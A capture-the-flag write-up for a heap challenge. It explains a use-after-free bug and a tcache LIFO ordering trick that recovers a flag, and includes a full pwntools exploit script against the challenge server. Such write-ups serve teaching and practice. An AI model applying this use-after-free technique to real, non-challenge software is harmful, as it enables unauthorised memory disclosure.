# Use-After-Free Tcache Manipulation Write-up

## Challenge Information

**Title:** CRUD Flag Shop  
**Decription:** Welcome to the alpha version of my flag shop. Currently you can do basic CRUD features in here. And yes you can get flag as well.
**Connection:** `nc ctf.m4.lu 65185`

## Initial Analysis

### Binary Examination with checksec

![](<img/1.png>)

First, I executed the binary and discovered a menu with options: Create, Delete, View, Get flag, and Exit. I used `checksec` to examine the binary protections and understand the mitigation context. The Create input requires Index, Size, and Content, making it clear this implements CRUD operations on the heap.

### Use-After-Free Discovery

![](<img/2.png>)

I tested the application flow by creating an object, deleting it, then viewing the same index. Interestingly, after deletion, the view option still attempts to print "Data: ..." from that slot. This indicates that the pointer in the array is not cleared after `free()`. In other words, there's a **Use-After-Free (UAF)** vulnerability - the program retains dangling pointers to freed memory chunks.

## Vulnerability Analysis

### Understanding the Get Flag Mechanism

![](<img/3.png>)

When the "Get flag" option is selected, the program creates exactly 5 heap allocations of size 0x70 (112 bytes) and copies the flag from `flag.txt` to the **last** (5th) allocation. The key insight is that we need to control where this 5th allocation lands in memory.

### GLIBC Tcache Exploitation Strategy

![](<img/4.png>)

Since GLIBC tcache operates as LIFO (Last In, First Out) per size class, I can manipulate the allocation order by pre-filling the tcache. My strategy:

1. Fill tcache for size 0x70 with 5 chunks (indices 1-5)
2. Free them in sequential order: 1, 2, 3, 4, 5
3. When "Get flag" performs 5 `malloc(0x70)` calls, tcache returns chunks in LIFO order: 5, 4, 3, 2, 1
4. The 5th allocation (containing the flag) lands in chunk 1's memory location
5. Since `users[1]` still holds the dangling pointer, `view(1)` will reveal the flag

## Solution Implementation

### Exploit Script

```python
from pwn import *

HOST, PORT = "ctf.m4.lu", 65185

def i2b(x):
    return str(x).encode()

def menu_create(s, idx, size, data=b"A\n"):
    s.sendlineafter(b"> ", b"1")
    s.sendlineafter(b"Index: ", i2b(idx))
    s.sendlineafter(b"Size: ", i2b(size))
    s.sendafter(b"Content: ", data if data.endswith(b"\n") else data + b"\n")
    s.recvuntil(b"Success")

def menu_delete(s, idx):
    s.sendlineafter(b"> ", b"2")
    s.sendlineafter(b"Index: ", i2b(idx))
    s.recvuntil(b"Success")

def menu_view(s, idx):
    s.sendlineafter(b"> ", b"3")
    s.sendlineafter(b"Index: ", i2b(idx))
    return s.recvline_contains(b"Data: ", timeout=2) or s.recvline(timeout=2)

def menu_get_flag(s):
    s.sendlineafter(b"> ", b"4")
    s.recvuntil(b"Flag is loaded", timeout=2)

def main():
    s = remote(HOST, PORT)
    # s = process("./chall")
    
    SIZE = 112  # 0x70
    
    # Create 5 chunks
    for idx, tag in [(1,b"A"),(2,b"B"),(3,b"C"),(4,b"D"),(5,b"E")]:
        menu_create(s, idx, SIZE, tag)
    
    # Free them in order to fill tcache
    menu_delete(s, 1)
    menu_delete(s, 2)
    menu_delete(s, 3)
    menu_delete(s, 4)
    menu_delete(s, 5)
    
    # Trigger flag loading
    menu_get_flag(s)
    
    # View the first chunk (which now contains the flag)
    s.sendlineafter(b"> ", b"3")
    s.sendlineafter(b"Index: ", b"1")
    s.recvuntil(b"Data: ")
    flag = s.recvline().strip()
    
    print(b"FLAG:", flag)
    s.close()

if __name__ == "__main__":
    main()
```

### Exploitation Process

The exploit process follows these steps:

1. **Fill tcache:** Create 5 chunks of size 0x70 (112 bytes) at indices 1-5
2. **Free in order:** Delete chunks 1, 2, 3, 4, 5 to populate the tcache LIFO queue
3. **Trigger flag loading:** Use the "Get flag" option which performs 5 malloc operations
4. **Access flag:** Due to LIFO ordering, the flag ends up in the first freed chunk, accessible via the stale pointer at index 1

## Flag

```
HiB25{H3AP_CH4LL3NG3S_FTW!!!}
```

## Summary

This challenge demonstrated:

1. **Use-After-Free Exploitation** - Leveraging dangling pointers in heap-based applications
2. **GLIBC Tcache Manipulation** - Understanding and exploiting LIFO allocation behavior
3. **Heap Feng Shui** - Precisely controlling memory layout through strategic allocation patterns
4. **Binary Analysis** - Identifying vulnerability patterns in CRUD implementations

The challenge required deep understanding of GLIBC's tcache implementation and its LIFO allocation strategy. The solution involved carefully orchestrating heap operations to ensure the flag-containing allocation would land at a memory address accessible through an existing Use-After-Free vulnerability. This demonstrates how modern heap exploits often require precise timing and understanding of allocator internals rather than traditional buffer overflow techniques.